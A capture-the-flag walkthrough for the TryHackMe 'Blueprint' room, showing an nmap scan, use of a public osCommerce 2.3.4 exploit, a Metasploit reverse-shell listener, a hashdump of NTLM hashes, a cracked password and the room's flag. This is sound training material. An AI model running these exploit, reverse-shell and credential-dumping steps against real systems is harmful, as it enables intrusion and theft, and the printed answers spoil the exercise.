# Blueprint

Hack into this Windows machine and escalate your privileges to Administrator.

[Blueprint](https://tryhackme.com/room/blueprint)

## Topic's

- Network Enumeration
- Code Injection
- Brute Forcing (NTML)

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Task 1 Blueprint

Do you have what is takes to hack into this Windows Machine?

It might take around 3-4 minutes for the machine to boot.

```
kali@kali:~/CTFs/tryhackme/Blueprint$ sudo nmap -A -sS -sC -sV -O 10.10.184.207
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-14 15:43 CEST
Nmap scan report for 10.10.184.207
Host is up (0.23s latency).
Not shown: 987 closed ports
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 7.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: 404 - File or directory not found.
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
|_http-title: Index of /
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
445/tcp   open  microsoft-ds Windows 7 Home Basic 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql        MariaDB (unauthorized)
8080/tcp  open  http         Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
|_http-title: Index of /
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  msrpc        Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/14%OT=80%CT=1%CU=32590%PV=Y%DS=2%DC=T%G=Y%TM=5F8700
OS:F5%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=105%TI=I%CI=I%II=I%SS=S%TS
OS:=7)SEQ(SP=103%GCD=1%ISR=105%TI=I%CI=I%TS=7)SEQ(SP=102%GCD=1%ISR=104%TI=I
OS:%II=I%SS=S%TS=7)OPS(O1=M508NW8ST11%O2=M508NW8ST11%O3=M508NW8NNT11%O4=M50
OS:8NW8ST11%O5=M508NW8ST11%O6=M508ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%
OS:W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M508NW8NNS%CC=N%Q=)T1(R=Y%DF=
OS:Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q
OS:=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%
OS:A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%
OS:DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%
OS:O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=Z%RUCK=0%RUD
OS:=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Hosts: www.example.com, BLUEPRINT, localhost; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -19m59s, deviation: 34m37s, median: 0s
|_nbstat: NetBIOS name: BLUEPRINT, NetBIOS user: <unknown>, NetBIOS MAC: 02:3d:f0:27:9e:cb (unknown)
| smb-os-discovery:
|   OS: Windows 7 Home Basic 7601 Service Pack 1 (Windows 7 Home Basic 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1
|   Computer name: BLUEPRINT
|   NetBIOS computer name: BLUEPRINT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-10-14T14:45:16+01:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2020-10-14T13:45:16
|_  start_date: 2020-10-14T13:41:38

TRACEROUTE (using port 143/tcp)
HOP RTT       ADDRESS
1   37.46 ms  10.8.0.1
2   228.37 ms 10.10.184.207

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 117.88 seconds
```

[http://10.10.184.207:8080/](http://10.10.184.207:8080/)

`oscommerce-2.3.4`

```
searchsploit oscommerce 2.3.4
searchsploit -m 44374
```

```
msfconsole -q
msf5 > use multi/handler
msf5 exploit(multi/handler) > set payload windows/shell/reverse_tcp
payload => windows/shell/reverse_tcp
msf5 exploit(multi/handler) > set lhost 10.9.0.54
lhost => 10.9.0.54
msf5 exploit(multi/handler) > run
```

```
kali@kali:~/CTFs/tryhackme/Blueprint$ python3 44374.py
[+] Successfully launched the exploit. Open the following URL to execute your code

http://10.10.184.207:8080//oscommerce-2.3.4./catalog/install/includes/configure.php
```

```
C:\xampp\htdocs\oscommerce-2.3.4\catalog\install\includes>whoami
whoami
nt authority\system

meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:549a1bcb88e35dc18c7a0b0168631411:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Lab:1000:aad3b435b51404eeaad3b435b51404ee:30e87bf999828446a1c1209ddde4c450:::
```

`30e87bf999828446a1c1209ddde4c450 NTLM googleplus`

```
cd /users/administrator/desktop

C:\Users\Administrator\Desktop>ls
ls
'ls' is not recognized as an internal or external command,
operable program or batch file.

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 14AF-C52C

 Directory of C:\Users\Administrator\Desktop

11/27/2019  07:15 PM    <DIR>          .
11/27/2019  07:15 PM    <DIR>          ..
11/27/2019  07:15 PM                37 root.txt.txt
               1 File(s)             37 bytes
               2 Dir(s)  19,505,586,176 bytes free

C:\Users\Administrator\Desktop>type root.txt.txt
type root.txt.txt
THM{aea1e3ce6fe7f89e10cea833ae009bee}
```

1. "Lab" user NTML hash decrypted

`googleplus`

2. root.txt

`THM{aea1e3ce6fe7f89e10cea833ae009bee}`
